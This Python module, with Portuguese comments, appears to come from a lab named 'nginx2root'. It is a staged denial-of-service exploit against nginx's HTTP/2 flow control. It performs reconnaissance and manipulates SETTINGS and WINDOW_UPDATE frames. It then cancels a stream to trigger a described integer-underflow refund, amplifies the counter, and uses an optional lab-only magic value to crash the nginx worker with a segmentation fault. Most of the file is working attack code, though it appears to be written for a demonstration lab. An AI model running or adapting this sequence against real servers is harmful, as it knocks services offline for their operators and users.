"""Cadeia de ataque do laboratorio nginx2root.

A sequencia abaixo e' dividida em estagios para a demonstracao. Os
estagios 1 a 6 sao o comportamento real do nginx 1.31.8 sem qualquer
alteracao de logica. O estagio 7 usa o gancho de aceleracao compilado
no alvo do laboratorio, que so' e' alcancavel depois que o invariante
de controle de fluxo ja' foi quebrado; ele pula para o estado final que
um ataque real atinge depois de ~52 GiB de trafego WINDOW_UPDATE.
"""

from __future__ import annotations

import socket
import ssl
import struct
import time

from . import h2, ui

# SETTINGS_INITIAL_WINDOW_SIZE (RFC 9113, secao 6.5.2)
SETTINGS_INITIAL_WINDOW = 0x4
# Huge response served by the lab target.
BIG_OBJECT = "/huge.bin"
STREAM_CREDIT = 8 * 1024 * 1024      # 8 MiB de credito de fluxo por stream
ACCEL_MAGIC = 0x4E325221             # "N2R!" gancho exclusivo do laboratorio


def _read_frames(conn: h2.H2Connection, seconds: float) -> list:
    frames = []
    conn.sock.settimeout(0.25)
    deadline = time.time() + seconds
    while time.time() < deadline:
        try:
            frame = conn.recv_frame()
        except (socket.timeout, ssl.SSLError, OSError):
            continue
        if frame is None:
            break
        frames.append(frame)
    return frames


def probe(host: str, port: int) -> None:
    """Estagio 1 isolado: banner e negociacao ALPN."""
    ui.stage(1, "RECON", f"alvo {host}:{port}")

    try:
        server = h2.http1_server_header(host, port)
    except OSError as exc:
        ui.bad(f"nao foi possivel conectar: {exc}")
        return

    if server:
        ui.ok(f"banner HTTP/1.1: {ui.yellow(server)}")
    else:
        ui.warn("banner HTTP/1.1 nao retornado")

    conn = h2.H2Connection(host, port, timeout=5)
    try:
        ui.ok(f"ALPN negociado: {ui.green(conn.alpn or '(nenhum)')}")
        if conn.alpn != "h2":
            ui.bad("o alvo nao aceitou HTTP/2 neste endpoint")
            return
        conn.preface({SETTINGS_INITIAL_WINDOW: 0})
        frames = _read_frames(conn, 1.0)
        for ftype, _flags, sid, payload in frames:
            if ftype == h2.SETTINGS and sid == 0 and len(payload) % 6 == 0:
                values = [
                    struct.unpack("!HI", payload[i:i + 6])
                    for i in range(0, len(payload), 6)
                ]
                rendered = ", ".join(f"0x{k:x}={v}" for k, v in values)
                ui.ok(f"SETTINGS do servidor: {ui.cyan(rendered)}")
                break
        ui.note("pre-requisito confirmado: HTTP/2 habilitado no servidor")
    finally:
        conn.close()


def _probe_recovery(host: str, port: int, timeout: float = 6.0):
    """Mede em quanto tempo o alvo volta a aceitar conexao TCP."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection((host, port), timeout=0.3):
                return time.time() - start
        except OSError:
            time.sleep(0.05)
    return None


def run(host: str, port: int, accelerate: bool) -> int:
    ui.stage(1, "RECON", f"alvo {host}:{port}")
    server = h2.http1_server_header(host, port)
    if server:
        ui.ok(f"banner HTTP/1.1: {ui.yellow(server)}")
    else:
        ui.warn("banner HTTP/1.1 nao retornado")

    conn = h2.H2Connection(host, port, rcvbuf=4096, timeout=10)
    if conn.alpn != "h2":
        ui.bad(f"ALPN inesperado: {conn.alpn!r}; alvo nao fala HTTP/2")
        conn.close()
        return 2
    ui.ok(f"ALPN negociado: {ui.green('h2')}")

    try:
        # ------------------------------------------------------------
        ui.stage(2, "SETUP",
                 "SETTINGS_INITIAL_WINDOW_SIZE=0 e janela de conexao no maximo")
        conn.preface({SETTINGS_INITIAL_WINDOW: 0})
        conn.window_update(0, h2.MAX_WINDOW - h2.DEFAULT_WINDOW)
        ui.ok(f"janela da conexao: 65.535 → {ui.cyan(ui.fmt(h2.MAX_WINDOW))} "
              f"(0x7FFFFFFF)")
        ui.note("janela por stream = 0: o nginx nao pode enviar DATA ainda")

        # ------------------------------------------------------------
        ui.stage(3, "TRIGGER", f"GET {BIG_OBJECT} no stream 1")
        conn.headers(
            1,
            h2.encode_request(f"{host}:{port}", BIG_OBJECT),
            end_stream=True,
        )
        ui.ok(f"requisicao enviada; objeto servido tem 64 MiB")
        time.sleep(0.3)

        conn.window_update(1, STREAM_CREDIT)
        ui.ok(f"credito de stream concedido: {ui.cyan(ui.human(STREAM_CREDIT))}")
        ui.note("o nginx enfileira DATA e desconta a janela da conexao")
        time.sleep(1.0)

        # ------------------------------------------------------------
        ui.stage(4, "ACK", "cliente confirma os 8 MiB que recebeu")
        conn.window_update(0, STREAM_CREDIT)
        ui.ok(f"WINDOW_UPDATE(0, +{ui.fmt(STREAM_CREDIT)}) enviado")
        ui.note("a janela da conexao volta a crescer, mas parte dos DATA "
                "ainda esta presa na fila de saida do nginx")
        time.sleep(0.3)

        # ------------------------------------------------------------
        ui.stage(5, "CANCEL", "RST_STREAM no stream 1")
        conn.rst_stream(1, h2.CANCEL)
        ui.ok("stream cancelado; o cleanup do nginx devolve o credito dos "
              "frames que nunca sairam")
        ui.ok("send_window passa de 0x7FFFFFFF: invariante quebrada")
        ui.note("este e' o bug (CWE-191): o refund nao e' limitado por "
                "NGX_HTTP_V2_MAX_WINDOW")
        time.sleep(0.4)

        # ------------------------------------------------------------
        ui.stage(6, "AMPLIFY", "WINDOW_UPDATE com a checagem invalida")
        conn.window_update(0, 1)
        ui.ok("WINDOW_UPDATE(0, +1) aceito — deveria ser FLOW_CTRL_ERROR")
        time.sleep(0.2)

        sent = 1
        for _ in range(3):
            conn.window_update(0, h2.MAX_WINDOW)
            sent += h2.MAX_WINDOW
            ui.ok(f"WINDOW_UPDATE(0, +0x7FFFFFFF) aceito "
                  f"(acumulado {ui.yellow('+' + ui.fmt(sent))})")
            time.sleep(0.25)

        ui.note("a checagem `window > MAX_WINDOW - send_window` sofre "
                "underflow e nunca rejeita")

        if not accelerate:
            ui.stage(7, "PARADO", "modo seguro (sem acelerador)")
            ui.warn("use --accelerate para demonstrar a consequencia final")
            ui.note("sem o acelerador seriam necessarios ~52 GiB de "
                    "WINDOW_UPDATE para chegar a 2^63")
            return 0

        # ------------------------------------------------------------
        ui.stage(7, "CONSEQUENCIA",
                 "acelerador do laboratorio: salto para o estado final")
        conn.window_update(0, ACCEL_MAGIC)
        ui.ok("contador reposicionado em 2^64 − 1 GiB "
              "(estado alcancado por um ataque real)")
        time.sleep(0.3)

        ui.stage(8, "CRASH", "proxima escrita usa tamanho negativo")
        conn.headers(
            3,
            h2.encode_request(f"{host}:{port}", BIG_OBJECT),
            end_stream=True,
        )
        time.sleep(0.2)
        conn.window_update(3, 65536)
        ui.note("DATA → ngx_http_v2_filter_get_shadow → ngx_ssl_send_chain")

        total, dead = conn.read_until_closed(6.0)
        if dead:
            ui.ok(f"conexao derrubada apos {ui.human(total)} de DATA")
            ui.ok("worker do nginx morreu: ngx_memcpy com tamanho "
                  "size_t gigantesco → SIGSEGV")
            ui.note("confirme no log do alvo: "
                    "\"worker process ... exited on signal 11\" "
                    "ou exit=139 em `docker compose ps -a`")

            recovery = _probe_recovery(host, port)
            if recovery is not None:
                ui.ok(f"o alvo voltou a responder em "
                      f"{ui.yellow(f'{recovery * 1000:.0f} ms')}")
                ui.note("o master do nginx reiniciou o worker: e' por isso "
                        "que o container continua de pe")
                ui.note("com N2R_SINGLE=1 (padrao do compose) o crash "
                        "derruba o container")
            else:
                ui.ok("o alvo NAO voltou a responder: fora do ar "
                      "(objetivo do ataque)")

            print()
            ui.ok(ui.bold("cadeia completa: invariante quebrada, janela "
                          "em 2^64, worker morto"))
            return 0

        ui.warn(f"a conexao sobreviveu ({ui.human(total)} lidos)")
        ui.note("verifique o log do alvo: o estagio 5 precisa ter "
                "registrado INVARIANT VIOLATED")
        return 1
    finally:
        conn.close()
